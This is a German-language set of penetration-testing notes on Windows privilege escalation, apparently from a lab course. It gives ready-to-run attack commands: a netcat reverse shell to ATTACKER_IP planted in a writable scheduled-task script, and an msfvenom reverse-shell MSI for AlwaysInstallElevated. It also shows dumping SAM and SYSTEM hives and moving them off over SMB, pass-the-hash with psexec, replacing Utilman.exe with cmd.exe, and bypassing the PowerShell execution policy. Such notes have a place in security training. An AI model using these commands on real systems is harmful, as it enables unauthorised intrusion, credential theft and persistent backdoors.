---
cover: >-
  https://www.heise.de/imgs/18/3/0/7/6/4/1/0/windows-os-windows-10-01-8c43924596804c6d.jpeg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Windows PrivEsc



<details>

<summary>Nützliche Links</summary>

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

[https://jlajara.gitlab.io/others/2020/11/22/Potatoes\_Windows\_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

[https://decoder.cloud/](https://decoder.cloud/)

[https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)

[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

[https://github.com/antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

</details>

## Sammeln von Passwörtern an den üblichen Orten

Bspw: Ein unvorsichtiger Benutzer hinterlässt seine Passwörter in Klartextdateien oder sie werden von Software wie Browsern oder E-Mail-Programmen gespeichert.



### Unbeaufsichtigte Windows-Installationen

Bei der Installation von Windows auf einer großen Anzahl von Hosts können Administratoren Windows Deployment Services verwenden, mit denen ein einziges Betriebssystem-Image über das Netzwerk auf mehreren Hosts bereitgestellt werden kann. Diese Art von Installationen werden als unbeaufsichtigte Installationen bezeichnet, da sie keine Benutzerinteraktion erfordern. Solche Installationen erfordern die Verwendung eines Administratorkontos, um die anfängliche Einrichtung durchzuführen, die auf dem Rechner an folgenden Stellen gespeichert werden kann:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

Dabei können Einträge mit \<credentials> gefunden werden.



### Powershell-Verlauf

Jedes Mal, wenn ein Benutzer einen Befehl mit Powershell ausführt, wird dieser in einer Datei gespeichert, die eine Erinnerung an frühere Befehle enthält. Dies ist nützlich, um Befehle, die Sie zuvor verwendet haben, schnell zu wiederholen. Wenn ein Benutzer einen Befehl ausführt, der ein Kennwort direkt als Teil der Powershell-Befehlszeile enthält, kann es später mit dem folgenden Befehl von einer **`cmd.exe`** - Eingabeaufforderung abgerufen werden:

{% code overflow="wrap" %}
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Powershell kennt %userprofile% nicht
Wenn es mit Powershell ausgeführt werden soll, muss es durch $Env:userprofile ersetzt werden
```
{% endcode %}



### Saved Windows Credentials

Windows erlaubt es, die Anmeldedaten anderer Benutzer zu verwenden. Diese Funktion bietet auch die Möglichkeit, diese Anmeldeinformationen im System zu speichern. Der folgende Befehl listet die gespeicherten Anmeldeinformationen auf:

```shell-session
cmdkey /list
```

Die eigentlichen Passwörter sind zwar nicht sichtbar, können aber mit dem Befehl `runas` und der Option `/savecred` verwendet werden, wie unten zu sehen.

```shell-session
runas /savecred /user:admin cmd.exe
```



### IIS Configuration

Internet Information Services (IIS) ist der Standard-Webserver auf Windows-Installationen. Die Konfiguration von Websites auf IIS wird in einer Datei namens `web.config` gespeichert und kann Passwörter für Datenbanken oder konfigurierte Authentifizierungsmechanismen enthalten. Abhängig von der installierten Version von IIS kann die Datei an einem der folgenden Orte gefunden werden:

* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

{% code overflow="wrap" %}
```
# Suche nach Strings für die DatenbankVerbindung
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
{% endcode %}



### Anmeldeinformationen von Software abrufen: PuTTY

PuTTY ist ein SSH-Client des Entwicklers Simon Tatham, der häufig auf Windows-Systemen zu finden ist. Anstatt die Parameter einer Verbindung jedes Mal neu festlegen zu müssen, können Benutzer Sitzungen speichern, in denen die IP, der Benutzer und andere Konfigurationen zur späteren Verwendung gespeichert werden können. PuTTY erlaubt es Benutzern zwar nicht, ihr SSH-Passwort zu speichern, aber es speichert Proxy-Konfigurationen, die Klartext-Authentifizierungsdaten enthalten.

Um die gespeicherten Proxy-Zugangsdaten abzurufen, kann mit dem folgenden Befehl unter dem folgenden Registrierungsschlüssel nach ProxyPassword gesucht werden:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

So wie Putty Anmeldeinformationen speichert, verfügt jede Software, die Passwörter speichert, einschließlich Browser, E-Mail-Clients, FTP-Clients, SSH-Clients, VNC-Software und andere, über Methoden zur Wiederherstellung von Passwörtern, die der Benutzer gespeichert hat.



### Geplante Aufgaben ( Scheduled )

```
schtasks  # Anzeige der Tasks
```

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             PSY-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Es gibt viele Informationen über die Aufgabe, aber das Wichtigste ist der Parameter "Task to Run", der angibt, was von der geplanten Aufgabe ausgeführt wird, und der Parameter "Run As User", der den Benutzer angibt, der für die Ausführung der Aufgabe verwendet wird.

Wenn der aktuelle Benutzer die ausführbare Datei "Task to Run" ändern oder überschreiben kann, kann er kontrollieren, was von dem Benutzer `taskusr1` ausgeführt wird, was zu einer einfachen Ausweitung der Rechte führt. Um die Dateiberechtigungen für die ausführbare Datei zu überprüfen, kann `icacls` verwendet werden:

```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Wie im Ergebnis zu sehen ist, hat die Gruppe BUILTIN\Users vollen Zugriff (F) auf die Binärdatei der Aufgabe. Das bedeutet, dass wir die .bat-Datei ändern und jede beliebige Nutzlast einfügen können. Der Einfachheit halber befindet sich `nc64.exe` unter `C:\tools`. Ändern wir die bat-Datei, um eine Reverse Shell zu starten:

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Wenn die geplante Aufgabe das nächste Mal ausgeführt wird, sollten wir die Reverse Shell mit den Rechten von `taskusr1` erhalten.

```
# Task manuell starten
C:\> schtasks /run /tn vulntask
```



### AlwaysInstallElevated

Windows-Installationsdateien (auch als .msi-Dateien bekannt) werden verwendet, um Anwendungen auf dem System zu installieren. Sie werden normalerweise mit der Berechtigungsstufe des Benutzers ausgeführt, der sie startet. Sie können jedoch so konfiguriert werden, dass sie von jedem Benutzerkonto (auch von einem nicht privilegierten) mit höheren Rechten ausgeführt werden. Dies könnte es uns ermöglichen, eine bösartige MSI-Datei zu erstellen, die mit Administratorrechten ausgeführt wird.

Für diese Methode müssen zwei Registrywerte festgelegt werden. Diese können mit den folgenden Befehlen über die Befehlszeile abgefragt werden.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Um diese Sicherheitslücke ausnutzen zu können, müssen beide Werte gesetzt sein. Andernfalls ist ein Ausnutzen nicht möglich. Wenn diese Werte gesetzt sind, kann mit msfvenom eine bösartige .msi-Datei erzeugt werden:

{% code overflow="wrap" %}
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.142.14 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
{% endcode %}

Da es sich um eine Reverse Shell handelt, muss auch das entsprechend konfigurierte Metasploit Handler-Modul ausgeführt werden. Sobald die erstellte Datei übertragen wurde, kann das Installationsprogramm mit dem unten stehenden Befehl ausgeführt werden, um die Reverse Shell zu erhalten:

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```



## Service-Fehlkonfigurationen

### Überblick Services

<pre><code>sc qc &#x3C;service_name>
# Anzeige der Konfigurationsinformationen eines Service

sc stop/start &#x3C;service_name>
# Service stoppen / starten

<strong># Unter PowerShell
</strong>sc.exe &#x3C;...>
</code></pre>

<figure><img src="../../../.gitbook/assets/Bildschirmfoto vom 2024-02-01 15-42-24.png" alt=""><figcaption><p>Konfigurationsübersicht des WindowsScheduler</p></figcaption></figure>

Speicherort der Servicekonfigurationen

`HKLM(HKEY_LOCAL_MACHINE)\SYSTEM\CurrentControlSet\Services\`

per default können nur Admins Systemvariablen ändern

<figure><img src="../../../.gitbook/assets/Bildschirmfoto vom 2024-02-01 14-29-18.png" alt=""><figcaption></figcaption></figure>

<table><thead><tr><th width="188.33333333333331">Subkey</th><th>Inhalt</th><th>sc-Parameter</th></tr></thead><tbody><tr><td>ImagePath</td><td>zugehörige ausführbare Datei</td><td>BINARY_PATH_NAME</td></tr><tr><td>ObjectName</td><td>zum Starten verwendeter Account</td><td>SERVICE_START_NAME</td></tr><tr><td>(Security)</td><td>Vorhanden wenn DACL konfiguriert wurde</td><td>-</td></tr></tbody></table>



### Ausführbare Datei ( unsichere Berechtigungen )

```
icacls <pfad/zur/datei>
# Anzeige der Berechtigungen einer Datei

icacls <pfad> /grant Everyone:F
# Jedem Nutzer auf Datei Vollzugriff erlauben
```

<figure><img src="../../../.gitbook/assets/Bildschirmfoto vom 2024-02-01 15-50-21.png" alt=""><figcaption></figcaption></figure>

Es werden die Berechtigungen der einzelnen Nutzer/Nutzergruppen angezeigt. Die Buchstaben in ( ? ) geben die erlaubten Aktionen an.

<table><thead><tr><th width="180">Rechte</th><th>Bedeutung</th></tr></thead><tbody><tr><td>N</td><td>(no access) - kein Zugriff</td></tr><tr><td>F</td><td>(full access) - Vollzugriff</td></tr><tr><td>M</td><td>(modify access) - Veränderung möglich</td></tr><tr><td>RX</td><td>(read and execute access) - Lesen und Ausführen</td></tr><tr><td>R</td><td>(read access) - Lesezugriff</td></tr><tr><td>W</td><td>(write access) - Schreibzugriff</td></tr><tr><td>D</td><td>(delete access) - Löschen</td></tr></tbody></table>

Es gibt noch weitere Kürzel, diese werden hier nicht aufgeführt, können aber durch Eingabe von "`icacls`" angezeigt werden.



### BINARY\_PATH ( unkommentiert )

```shell-session
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
        
```

Durch fehlende Anführungszeichen kommen mehrere Pfade in Frage:

| Befehl                                               | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |

Windows prüft von minimal auf maximal wie in der Tabelle aufgelistet. Ist eine Datei unter dem Namen vorhanden, wird sie ausgeführt. D.h. es kann eine Datei eingeschleust werden, die bspw. Disk.exe darstellt.



### Service ( unsichere Berechtigungen )

Möglichkeit zur Rekonfiguration eines bestehenden Services ( service DACL )

```
accesschk64.exe -qlc <service_name>
# Prüfung der service DACL eines Dienstes mit Accesschk ( sysinternals )
```

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc psyservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
        
 # Die Gruppe BUILTIN\\USERS hat hier die Berechtigung SERVICE_ALL_ACCESS, womit
 eine Modifikation der Servicekonfiguration möglich ist.
```

```
sc config <service_name> binPath= "C:\pfad\zur\Datei" obj= LocalSystem
# Änderung von ImagePath und ObjectName eines Services
```



## Missbrauch gefährlicher Privilegien

{% embed url="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants" fullWidth="false" %}

{% embed url="https://github.com/gtworek/Priv2Admin" fullWidth="false" %}

```
whoami /priv
# Anzeige der Berechtigungen des aktuellen Users
```

### SeBackup / SeRestore

<pre><code>C:\> reg save hklm\system C:\Users\PSYBackup\system.hive
The operation completed successfully.
<strong># Backup der System Hashes
</strong>
C:\> reg save hklm\sam C:\Users\PSYBackup\sam.hive
The operation completed successfully.
<strong># Backup der SAM Hashes
</strong></code></pre>

{% code overflow="wrap" %}
```
python3 /usr/bin/smbserver.py -smb2support -username <user> -password <pass> public <localdir>
# Starten des Impacket SMBServers zum Transfer der Daten Windows -> Linux

copy <dateipfad> \\<localIP>\public\
# Zugehöriger Befehl zum Kopieren (Win-seitig)
```
{% endcode %}

```
python3 /usr/bin/secretsdump.py -sam <sam.hive> -system <system.hive> LOCAL
# Pashwort-Hashes offenlegen für PassTheHash
```

{% code overflow="wrap" %}
```
python3 /usr/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@<zielIP>
# PassTheHash
```
{% endcode %}

### SeTakeOwnership

```
C:\Windows\System32\Utilman.exe
# Programm für Hilfe-Panel im Lockscreen

takeown /f <pfad\zur\datei.exe>
# Neuen Besitzer festlegen

icacls C:\Windows\System32\Utilman.exe /grant PSYTakeOwnership:F
# Vollzugriff auf Datei erlauben

copy cmd.exe utilman.exe
# inhalt von cmd in utilman kopieren
```



### SeImpersonate / SeAssignPrimaryToken









## Missbrauch anfälliger Software

```
wmic product get name,version,vendor
# Installierte Anwendungen + Versionen
```





## Nützliche Tools

### WinPEAS

Linpeas für Windows ( [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) )

```shell-session
C:\> winpeas.exe > outputfile.txt
```



### PrivescCheck

( [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) )

PrivescCheck ist ein PowerShell-Skript, das auf dem Zielsystem nach allgemeiner Privilegienerweiterung sucht. Es bietet eine Alternative zu WinPEAS, ohne dass die Ausführung einer Binärdatei erforderlich ist.

Zur Erinnerung: Um PrivescCheck auf dem Zielsystem auszuführen, muss möglicherweise die Ausführungsrichtlinie umgangen werden. Dazu kann, wie unten gezeigt, das Cmdlet "Set-ExecutionPolicy" verwendet werden.

```shell-session
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

### WES-NG: Windows Epxloit Suggester - Next Generation

( [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) )

Einige Exploit-Skripte (z. B. winPEAS) erfordern, dass man die Skripte auf das Zielsystem hochlädt und sie dort ausführt. Dies kann dazu führen, dass Antivirenprogramme sie erkennen und löschen. Um unnötigen Lärm zu vermeiden, der Aufmerksamkeit erregen könnte, sollte besser WES-NG verwendet werden, das auf dem angreifenden Rechner ausgeführt wird

Nach der Installation und vor der Verwendung des Skripts geben Sie den Befehl `wes.py --update` ein, um die Datenbank zu aktualisieren. Das Skript bezieht sich auf die von ihm erstellte Datenbank, um nach fehlenden Patches zu suchen, die zu einer Schwachstelle führen können, die Sie nutzen können, um Ihre Rechte auf dem Zielsystem zu erhöhen.

Um das Skript zu verwenden, müssen Sie den Befehl `systeminfo` auf dem Zielsystem ausführen. Vergessen Sie nicht, die Ausgabe in eine .txt-Datei zu leiten, die Sie auf Ihren Angriffsrechner verschieben müssen.

```
# wes starten
wes.py systeminfo.txt
```

### Metasploit

Wenn Meterpreter-Shell auf Zielsystem vorhanden:

`multi/recon/local_exploit_suggester` # listet mögliche Schwachstellen des Systems auf

